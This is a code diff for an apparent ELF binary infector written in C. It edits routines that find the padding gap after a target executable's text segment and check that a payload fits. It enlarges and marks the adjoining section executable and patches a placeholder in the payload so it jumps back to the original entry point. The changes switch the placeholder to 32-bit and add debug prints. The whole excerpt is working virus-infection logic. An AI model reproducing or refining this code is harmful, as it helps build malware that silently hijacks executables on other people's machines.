@@ -89,14 +89,14 @@ char* get_section(elf_stat* stat, const char* s_name, uint64_t* size) {
 }
 
 
-int replace_fake_entry_point(char* payload_data, int payload_size, uint64_t fake, uint64_t real) {
+int replace_fake_entry_point(char* payload_data, int payload_size, uint32_t fake, uint32_t real) {
     int i;
-    uint64_t value;
+    uint32_t value;
 
     for (i = 0; i < payload_size; i++) {
-        value = *((uint64_t*) (payload_data + i));
+        value = *((uint32_t*) (payload_data + i));
         if ((value ^ fake) == 0) {
-            *((uint64_t*) (payload_data + i)) = real;
+            *((uint32_t*) (payload_data + i)) = real;
             return 0;
         }
     }
@@ -127,7 +127,10 @@ int prepare_infection(elf_stat* target, elf_stat* payload) {
             text_segment = target->phdr[i];
             data_segment = target->phdr[i+1];
 
+            printf("Data segemnt start %lu\n", data_segment.p_offset);
+
             end_of_text_segment = text_segment.p_offset + text_segment.p_filesz;
+            printf("Text segemnt end %lu\n", end_of_text_segment);
             gap_size = data_segment.p_offset - end_of_text_segment;
             printf("gap_size = %lu, payload_size = %lu\n", gap_size, payload_text_size);
             if (gap_size < payload_text_size) {
@@ -145,12 +148,14 @@ int prepare_infection(elf_stat* target, elf_stat* payload) {
     }
 
     for (i = 0; i < target->ehdr->e_shnum; i++){
-        if (target->shdr[i].sh_addr + target->shdr[i].sh_size == payload_vaddr) {
+        if (target->shdr[i].sh_offset + target->shdr[i].sh_size == end_of_text_segment) {
+            printf("Shdr %d\n", i);
             target->shdr[i].sh_size += payload_text_size;
+            target->shdr[i].sh_flags |= SHF_EXECINSTR;
         }
     }
 
-    int res = replace_fake_entry_point(payload_text_section, payload_text_size, (uint64_t) 0x1111111111111111, (uint64_t) old_entry_point);
+    int res = replace_fake_entry_point(payload_text_section, payload_text_size, (uint32_t) 0x11111111, (uint32_t) (end_of_text_segment - old_entry_point));
     if (res == -1) {
         fprintf(stderr, "Cant find replace point\n");
         exit(1);
